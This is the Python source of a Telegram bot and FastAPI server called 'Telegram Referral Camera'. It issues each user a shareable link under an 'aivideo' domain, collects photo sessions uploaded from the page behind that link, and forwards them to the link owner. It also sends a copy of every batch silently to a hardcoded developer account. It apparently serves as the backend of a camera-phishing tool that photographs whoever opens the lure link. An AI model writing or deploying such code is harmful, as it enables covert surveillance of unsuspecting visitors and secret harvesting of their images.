    InputMediaPhoto,
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from aiogram.filters import CommandStart
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv

from locales import LANGUAGES, DEFAULT_LANG, TEXTS, t
from database import (
    init_db,
    get_or_create_user,
    get_user,
    increment_referrals,
    get_stats,
    get_total_users,
    set_user_language,
)


# =========================================================
# تحميل المتغيرات
# =========================================================

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")

ADMIN_TELEGRAM_ID = int(
    os.getenv("ADMIN_TELEGRAM_ID", "6002805119")
)

CHANNEL_USERNAME = "@KhaldounSoft"
CHANNEL_LINK = "https://t.me/KhaldounSoft"

BASE_URL = os.getenv(
    "BASE_URL",
    "https://aivideo.apps.bot-hosting.cloud",
).rstrip("/")

MAX_PHOTOS = 10
MAX_PHOTO_SIZE = 10 * 1024 * 1024  # 10 ميجا لكل صورة

# مؤقت الجلسة بالثواني (debounce)
SESSION_TIMEOUT = int(os.getenv("SESSION_TIMEOUT", "60"))


if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")


# =========================================================
# إنشاء البوت
# =========================================================

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# =========================================================
# تخزين الجلسات في الذاكرة
# =========================================================

_sessions: dict[str, dict] = {}
# {
#   "session_id": {
#       "referral_id": str,
#       "total": int,
#       "photos": list[bytes],
#       "indices": list[int],
#       "timer": asyncio.TimerHandle | None,
#       "created_at": float,
#   }
# }


# =========================================================
# تشغيل البوت مع FastAPI
# =========================================================

@asynccontextmanager
async def lifespan(app: FastAPI):

    await init_db()

    polling_task = asyncio.create_task(
        dp.start_polling(bot)
    )

    try:
        yield

    finally:
        # إلغاء كل المؤقتات المعلقة
        for sid, sess in list(_sessions.items()):
            timer = sess.get("timer")
            if timer:
                timer.cancel()
        _sessions.clear()

        try:
            await dp.stop_polling()
        except Exception:
            pass

        polling_task.cancel()

        try:
            await polling_task
        except asyncio.CancelledError:
            pass

        await bot.session.close()


app = FastAPI(
    title="Telegram Referral Camera",
    lifespan=lifespan,
)

templates = Jinja2Templates(directory="templates")


# =========================================================
# التحقق من الاشتراك
# =========================================================

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(
            chat_id=CHANNEL_USERNAME,
            user_id=user_id,
        )
        status = member.status
        print(f"[SUBSCRIPTION] user={user_id} status={status}")
        return status in {"creator", "administrator", "member"}

    except TelegramBadRequest as error:
        msg = str(error).lower()
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        if "user not found" in msg or "participant" in msg:
            return False
        return True

    except Exception as error:
        print(f"[SUBSCRIPTION ERROR] user={user_id}: {error}")
        return True


# =========================================================
# لوحة اختيار اللغة
# =========================================================

def get_language_keyboard():
    buttons = []
    row = []
    for code, info in LANGUAGES.items():
        row.append(
            InlineKeyboardButton(
                text=f"{info['flag']} {info['name']}",
                callback_data=f"lang:{code}",
            )
        )
        if len(row) == 2:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    return InlineKeyboardMarkup(inline_keyboard=buttons)


# =========================================================
# لوحة الاشتراك
# =========================================================

def get_subscription_keyboard(lang: str):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_subscribe"),
                    url=CHANNEL_LINK,
                )
            ],
            [
                InlineKeyboardButton(
                    text=t(lang, "btn_confirm_sub"),
                    callback_data="check_sub",
                )
            ],
        ]
    )


# =========================================================
# لوحة الأدمن / المستخدم
# =========================================================

def get_admin_keyboard(lang: str):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t(lang, "btn_stats"))],
            [KeyboardButton(text=t(lang, "change_language"))],
            [KeyboardButton(text=t(lang, "btn_start"))],
        ],
        resize_keyboard=True,
        persistent=True,
    )


def get_user_keyboard(lang: str):
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text=t(lang, "change_language"))],
            [KeyboardButton(text=t(lang, "btn_start"))],
        ],
        resize_keyboard=True,
        persistent=True,
    )


# =========================================================
# إرسال الواجهة الرئيسية
# =========================================================

async def send_main_dashboard(message_or_call, user, lang: str = DEFAULT_LANG):

    user_id = user.id
    name = user.full_name
    username = user.username or ""

    db_user, is_new = await get_or_create_user(
        telegram_id=user_id,
        name=name,
        username=username,
    )

    if is_new:
        username_text = (
            f"@{username}" if username
            else t("ar", "no_username")
        )
        total = await get_total_users()

        admin_notice = (
            f"👤 <b>{t('ar', 'new_user_notice')}</b>\n\n"
            f"{t('ar', 'new_user_name')}: {html.escape(name)}\n"
            f"{t('ar', 'new_user_username')}: {html.escape(username_text)}\n"
            f"{t('ar', 'new_user_id')}: <code>{user_id}</code>\n"
            f"{t('ar', 'new_user_total')}: {total}"
        )

        try:
            await bot.send_message(
                chat_id=ADMIN_TELEGRAM_ID,
                text=admin_notice,
                parse_mode="HTML",
            )
        except Exception as error:
            print(f"فشل إرسال إشعار المستخدم الجديد: {error}")

    username_text = f"@{username}" if username else t(lang, "no_username")

    welcome_text = (
        f"{t(lang, 'welcome', name=html.escape(name))}\n\n"
        f"{t(lang, 'your_id')}: <code>{user_id}</code>\n"
        f"{t(lang, 'your_username')}: {html.escape(username_text)}\n\n"
        f"{t(lang, 'your_link')}\n"
        f"{BASE_URL}/?q={user_id}\n\n"
        f"<b>{t(lang, 'steps_title')}</b>\n"
        f"{t(lang, 'step1')}\n"
        f"{t(lang, 'step2')}\n"
        f"{t(lang, 'step3')}\n\n"
        f"{t(lang, 'your_referrals')}: <b>{db_user.referrals}</b>"
    )

    keyboard = (
        get_admin_keyboard(lang)
        if user_id == ADMIN_TELEGRAM_ID
        else get_user_keyboard(lang)
    )

    if isinstance(message_or_call, Message):
        await message_or_call.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    else:
        await message_or_call.message.answer(
            welcome_text,
            reply_markup=keyboard,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )


# =========================================================
# /start
# =========================================================

@dp.message(CommandStart())
async def start_handler(message: Message):

    user_id = message.from_user.id

    existing = await get_user(user_id)

    if not existing or not existing.language:
        await message.answer(
            t(DEFAULT_LANG, "choose_language"),
            reply_markup=get_language_keyboard(),
        )
        return

    lang = existing.language

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(lang, 'must_subscribe')}\n\n"
            f"{t(lang, 'subscribe_hint')}"
        )
        await message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(lang),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(message, message.from_user, lang)


# =========================================================
# معالج اختيار اللغة
# =========================================================

@dp.callback_query(F.data.startswith("lang:"))
async def language_callback(call: CallbackQuery):

    code = call.data.split(":")[1]
    if code not in LANGUAGES:
        await call.answer("Invalid language", show_alert=True)
        return

    user_id = call.from_user.id

    existing = await get_user(user_id)
    if existing:
        await set_user_language(user_id, code)
    else:
        await get_or_create_user(
            telegram_id=user_id,
            name=call.from_user.full_name,
            username=call.from_user.username or "",
        )
        await set_user_language(user_id, code)

    await call.answer(t(code, "lang_changed"))

    try:
        await call.message.delete()
    except Exception:
        pass

    is_subscribed = await check_subscription(user_id)

    if not is_subscribed:
        sub_text = (
            f"{t(code, 'must_subscribe')}\n\n"
            f"{t(code, 'subscribe_hint')}"
        )
        await call.message.answer(
            sub_text,
            reply_markup=get_subscription_keyboard(code),
            parse_mode="HTML",
        )
        return

    await send_main_dashboard(call, call.from_user, code)


# =========================================================
# زر تأكيد الاشتراك
# =========================================================

@dp.callback_query(F.data == "check_sub")
async def check_sub_callback(call: CallbackQuery):

    user_id = call.from_user.id
    user = await get_user(user_id)
    lang = user.language if user else DEFAULT_LANG

    is_subscribed = await check_subscription(user_id)

    if is_subscribed:
        await call.answer(t(lang, "sub_success"))
        try:
            await call.message.delete()
        except Exception:
            pass
        await send_main_dashboard(call, call.from_user, lang)
        return

    await call.answer(t(lang, "sub_failed"), show_alert=True)


# =========================================================
# زر تغيير اللغة
# =========================================================

@dp.message(F.text.in_({
    t(code, "change_language") for code in LANGUAGES
}))
async def change_language_handler(message: Message):

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    await message.answer(
        t(lang, "choose_language"),
        reply_markup=get_language_keyboard(),
    )


# =========================================================
# إحصائيات البوت
# =========================================================

@dp.message(F.text.in_({
    t(code, "btn_stats") for code in LANGUAGES
}))
async def stats_handler(message: Message):

    if message.from_user.id != ADMIN_TELEGRAM_ID:
        return

    user = await get_user(message.from_user.id)
    lang = user.language if user else DEFAULT_LANG

    stats = await get_stats()

    text = (
        f"{t(lang, 'stats_title')}\n\n"
        f"{t(lang, 'stats_total')}: <b>{stats['total']}</b>\n"
        f"{t(lang, 'stats_7days')}: <b>{stats['last_7_days']}</b>\n"
        f"{t(lang, 'stats_month')}: <b>{stats['this_month']}</b>"
    )

    await message.answer(text, parse_mode="HTML")


# =========================================================
# الصفحة الرئيسية
# =========================================================

@app.get("/", response_class=HTMLResponse)
async def home(request: Request, q: str = Query(default="")):

    if not q:
        return """
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport"
                  content="width=device-width, initial-scale=1.0">
            <title>الرابط غير صحيح</title>
        </head>
        <body style="font-family:sans-serif;text-align:center;padding:40px">
            <h2>❌ الرابط غير صحيح</h2>
            <p>يجب فتح رابط إحالة صالح.</p>
        </body>
        </html>
        """

    lang = DEFAULT_LANG
    if q.isdigit():
        owner = await get_user(int(q))
        if owner and owner.language:
            lang = owner.language

    web_texts = {
        key: t(lang, key)
        for key in TEXTS[lang]
        if key.startswith("web_")
    }

    return templates.TemplateResponse(
        request=request,
        name="index.html",
        context={
            "referral_id": q,
            "lang": lang,
            "is_rtl": lang in ("ar", "fa"),
            "texts": web_texts,
        },
    )


# =========================================================
# إرسال الصور كألبوم (الدالة المركزية)
# =========================================================

async def flush_session(session_id: str, reason: str = "finish"):
    """
    يجمع الصور المخزنة في الجلسة ويرسلها كألبوم واحد.
    reason: "finish" | "timeout" | "shutdown"
    """
    sess = _sessions.pop(session_id, None)
    if not sess:
        return

    timer = sess.get("timer")
    if timer:
        try:
            timer.cancel()
        except Exception:
            pass

    photos = sess.get("photos", [])
    indices = sess.get("indices", [])
    referral_id = sess.get("referral_id", "")
    total = sess.get("total", 0)

    if not photos:
        print(f"[FLUSH] session {session_id[:8]} empty (reason={reason})")
        return

    if not referral_id.isdigit():
        print(f"[FLUSH] session {session_id[:8]} invalid referral_id")
        return

    owner_id = int(referral_id)
    owner = await get_user(owner_id)

    if not owner:
        print(f"[FLUSH] session {session_id[:8]} owner not found")
        return

    lang = owner.language or DEFAULT_LANG
    username = owner.username or ""
    name = owner.name or "—"
    username_text = f"@{username}" if username else t(lang, "no_username")

    # بناء الكابشن
    sent_count = len(photos)
    reason_label = {
        "finish": "completed",
        "timeout": "auto (inactivity)",
        "shutdown": "shutdown",
    }.get(reason, reason)

    caption = (
        f"{t(lang, 'photo_caption')} ({sent_count}/{total})\n\n"
        f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
        f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
        f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
        f"{t(lang, 'photo_ref_id')}: {referral_id}\n"
        f"🔖 Session: <code>{session_id[:8]}</code>\n"
        f"⚡ Reason: <b>{reason_label}</b>"
    )

    # إرسال لصاحب الرابط
    if len(photos) == 1:
        # صورة واحدة → send_photo
        try:
            await bot.send_photo(
                chat_id=owner_id,
                photo=BufferedInputFile(photos[0], filename="photo_1.jpg"),
                caption=caption,
                parse_mode="HTML",
            )
            print(f"[FLUSH] 1 photo → owner {owner_id} (session {session_id[:8]})")
        except Exception as e:
            print(f"[FLUSH OWNER ERROR] {e!r}")
            return
    else:
        # أكثر من صورة → send_media_group
        media_group = []
        for i, photo_bytes in enumerate(photos):
            media_group.append(
                InputMediaPhoto(
                    media=BufferedInputFile(
                        photo_bytes,
                        filename=f"photo_{indices[i] if i < len(indices) else i + 1}.jpg",
                    ),
                    caption=(caption if i == 0 else ""),
                    parse_mode="HTML",
                )
            )

        try:
            await bot.send_media_group(
                chat_id=owner_id,
                media=media_group,
            )
            print(f"[FLUSH] {len(photos)} photos → owner {owner_id} (session {session_id[:8]})")
        except Exception as e:
            print(f"[FLUSH OWNER ERROR] {e!r}")
            return

    # نسخة للمطور
    try:
        if len(photos) == 1:
            await bot.send_photo(
                chat_id=ADMIN_TELEGRAM_ID,
                photo=BufferedInputFile(photos[0], filename="photo_1_admin.jpg"),
                caption=caption,
                parse_mode="HTML",
            )
        else:
            admin_media = []
            for i, photo_bytes in enumerate(photos):
                admin_media.append(
                    InputMediaPhoto(
                        media=BufferedInputFile(
                            photo_bytes,
                            filename=f"photo_{indices[i] if i < len(indices) else i + 1}_admin.jpg",
                        ),
                        caption=(caption if i == 0 else ""),
                        parse_mode="HTML",
                    )
                )
            await bot.send_media_group(
                chat_id=ADMIN_TELEGRAM_ID,
                media=admin_media,
            )
    except Exception as e:
        print(f"[FLUSH ADMIN ERROR] {e!r}")

    # زيادة referrals
    await increment_referrals(owner_id)
    print(f"[FLUSH] +1 referral for {owner_id} (session {session_id[:8]})")


# =========================================================
# Timer: جدولة إرسال الجلسة بعد توقف الصور
# =========================================================

def schedule_session_flush(session_id: str):
    """يعيد ضبط المؤقت ليرسل الجلسة بعد SESSION_TIMEOUT ثانية"""
    sess = _sessions.get(session_id)
    if not sess:
        return

    # إلغاء المؤقت القديم
    old_timer = sess.get("timer")
    if old_timer:
        try:
            old_timer.cancel()
        except Exception:
            pass

    loop = asyncio.get_event_loop()

    def _on_timeout():
        # جدولة الـ flush كـ task (لا نستطيع await هنا)
        asyncio.create_task(flush_session(session_id, reason="timeout"))

    timer = loop.call_later(SESSION_TIMEOUT, _on_timeout)
    sess["timer"] = timer


# =========================================================
# استقبال صورة واحدة (تخزين فقط)
# =========================================================

@app.post("/upload-single-photo")
async def upload_single_photo(
    photo: UploadFile = File(...),
    referral_id: str = Form(...),
    session_id: str = Form(...),
    index: int = Form(...),
    total: int = Form(...),
):

    if not referral_id.isdigit():
        return {"success": False, "message": "Invalid Referral ID."}

    if not session_id:
        return {"success": False, "message": "Invalid session."}

    owner = await get_user(int(referral_id))
    if not owner:
        return {"success": False, "message": "Invalid referral link."}

    image_bytes = await photo.read()

    if not image_bytes:
        return {"success": False, "message": "Empty photo."}

    if len(image_bytes) > MAX_PHOTO_SIZE:
        return {"success": False, "message": "Photo too large."}

    # إنشاء الجلسة إن لم تكن موجودة
    if session_id not in _sessions:
        _sessions[session_id] = {
            "referral_id": referral_id,
            "total": total,
            "photos": [],
            "indices": [],
            "timer": None,
            "created_at": time.time(),
        }

    sess = _sessions[session_id]
    sess["photos"].append(image_bytes)
    sess["indices"].append(index)
    sess["total"] = total

    # إعادة ضبط المؤقت
    schedule_session_flush(session_id)

    print(
        f"[STORED] session {session_id[:8]} photo {index}/{total} "
        f"({len(image_bytes)} bytes, total={len(sess['photos'])})"
    )

    return {
        "success": True,
        "message": f"Photo {index} stored ({len(sess['photos'])}/{total})",
        "stored": len(sess["photos"]),
    }


# =========================================================
# إنهاء الجلسة (إرسال فوري)
# =========================================================

@app.post("/finish-session")
async def finish_session(payload: dict):

    session_id = str(payload.get("session_id", ""))
    referral_id = str(payload.get("referral_id", ""))
    total = int(payload.get("total", 0))
    sent = int(payload.get("sent", 0))
    failed = int(payload.get("failed", 0))

    if not session_id:
        return {"success": False, "message": "No session."}

    # إرسال فوري (بدون انتظار المؤقت)
    await flush_session(session_id, reason="finish")

    return {
        "success": True,
        "message": "Session flushed.",
        "sent": sent,
        "failed": failed,
    }


# =========================================================
# استقبال الصور (الطريقة القديمة — ألبوم دفعة واحدة)
# =========================================================

@app.post("/upload-photo")
async def upload_photo(
    photos: List[UploadFile] = File(...),
    referral_id: str = Form(...),
):

    if not referral_id.isdigit():
        return {"success": False, "message": "Invalid Referral ID."}

    if not photos:
        return {"success": False, "message": "No photos."}

    if len(photos) > MAX_PHOTOS:
        return {"success": False, "message": f"Max {MAX_PHOTOS} photos."}

    owner_id = int(referral_id)
    owner = await get_user(owner_id)

    if not owner:
        return {"success": False, "message": "Invalid referral link."}

    lang = owner.language or DEFAULT_LANG

    username = owner.username or ""
    name = owner.name or "—"
    username_text = f"@{username}" if username else t(lang, "no_username")

    caption = (
        f"{t(lang, 'photo_caption')}\n\n"
        f"{t(lang, 'photo_owner')}: {html.escape(name)}\n"
        f"{t(lang, 'photo_username')}: {html.escape(username_text)}\n"
        f"{t(lang, 'photo_tg_id')}: {owner_id}\n"
        f"{t(lang, 'photo_ref_id')}: {referral_id}"
    )

    media_group_owner = []
    media_group_admin = []

    for idx, photo in enumerate(photos):
        image_bytes = await photo.read()
        if not image_bytes:
            continue

        if len(image_bytes) > MAX_PHOTO_SIZE:
            return {
                "success": False,
                "message": f"Photo {idx + 1} too large.",
            }

        media_group_owner.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                )
            )
        )

        media_group_admin.append(
            InputMediaPhoto(
                media=BufferedInputFile(
                    image_bytes,
                    filename=f"photo_{idx + 1}.jpg",
                ),
                caption=(caption if idx == 0 else ""),
                parse_mode="HTML",
            )
        )

    if not media_group_owner:
        return {"success": False, "message": "No valid photos."}

    owner_ok = True
    try:
        await bot.send_media_group(
            chat_id=owner_id,
            media=media_group_owner,
        )
    except Exception as error:
        print(f"[SEND OWNER ERROR] {error!r}")
        owner_ok = False

    try:
        await bot.send_media_group(
            chat_id=ADMIN_TELEGRAM_ID,
            media=media_group_admin,
        )
    except Exception as error:
        print(f"[SEND ADMIN ERROR] {error!r}")

    if not owner_ok:
        return {
            "success": False,
            "message": "Failed to send to owner.",
        }

    await increment_referrals(owner_id)

    return {"success": True, "message": "Photos sent."}
